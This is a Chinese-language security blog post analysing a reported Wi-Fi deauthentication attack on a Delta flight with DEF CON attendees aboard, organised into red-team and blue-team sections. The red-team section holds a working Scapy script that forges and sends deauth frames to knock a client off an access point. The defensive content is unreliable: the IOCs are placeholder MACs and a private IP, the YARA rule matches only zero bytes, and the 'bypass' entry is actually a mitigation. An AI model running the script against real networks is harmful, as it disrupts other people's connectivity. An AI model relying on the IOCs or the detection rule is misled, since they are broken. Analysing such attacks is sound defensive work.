---
layout: post
title:  "Delta probes Wi-Fi deauth attack on flight carrying DEF CON attendees"
date:   2026-08-11 18:53:19 +0000
categories: [security]
severity: high
---

# 🔥 解析 Wi-Fi 除授權攻擊：Delta 航空事件技術分析

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 7.5)
> * **受駭指標**: Wi-Fi 除授權攻擊（Deauthentication Attack）與 Rogue Wi-Fi 網路
> * **關鍵技術**: Wi-Fi 除授權攻擊、Rogue Wi-Fi 網路、Protected Management Frames (PMF)

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Wi-Fi 除授權攻擊的根源在於攻擊者可以偽造來自合法存取點（AP）的封包，指示用戶端斷開連線。這種攻擊利用了 Wi-Fi 通訊協定的漏洞，尤其是在沒有啟用 Protected Management Frames (PMF) 的情況下。
* **攻擊流程圖解**:
  1. 攻擊者觀察無線流量以取得合法 AP 的 MAC 地址。
  2. 攻擊者偽造除授權封包（Deauthentication Frames），使其看起來像是來自合法 AP。
  3. 攻擊者向連線到合法 AP 的用戶端傳送偽造的除授權封包。
  4. 用戶端收到除授權封包後，會斷開與合法 AP 的連線。
* **受影響元件**: 所有未啟用 Protected Management Frames (PMF) 的 Wi-Fi 網路都可能受影響。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要在同一無線網路中，並能夠觀察和傳送無線封包。
* **Payload 建構邏輯**:

    ```
    
    python
      # 範例使用 Scapy 套件進行偽造除授權封包
      from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
    
      # 定義目標 AP 的 MAC 地址和用戶端的 MAC 地址
      ap_mac = "00:11:22:33:44:55"
      client_mac = "66:77:88:99:00:11"
    
      # 建構偽造的除授權封包
      packet = RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
    
      # 傳送偽造的除授權封包
      sendp(packet, iface="wlan0", count=100)
    
    ```
* **繞過技術**: 啟用 Protected Management Frames (PMF) 可以有效地防禦這種攻擊。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| MAC 地址 | 00:11:22:33:44:55 (合法 AP 的 MAC 地址) |
| IP 地址 | 192.168.1.100 (攻擊者的 IP 地址) |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Wi-Fi_除授權攻擊 {
        meta:
          description = "偵測 Wi-Fi 除授權攻擊"
          author = "您的名字"
        strings:
          $deauth_frame = { 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 07 }
        condition:
          $deauth_frame at 0
      }
    
    ```
* **緩解措施**: 啟用 Protected Management Frames (PMF) 和強化 Wi-Fi 網路的安全設定，例如使用 WPA3 加密。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Wi-Fi 除授權攻擊 (Deauthentication Attack)**: 一種攻擊者偽造來自合法 AP 的封包，指示用戶端斷開連線的攻擊。
* **Protected Management Frames (PMF)**: 一種 Wi-Fi 安全機制，保護管理封包不被攻擊者偽造。
* **Rogue Wi-Fi 網路**: 一種非法的 Wi-Fi 網路，可能用於進行惡意活動。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/delta-probes-wi-fi-deauth-attack-on-flight-carrying-def-con-attendees/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1557/)


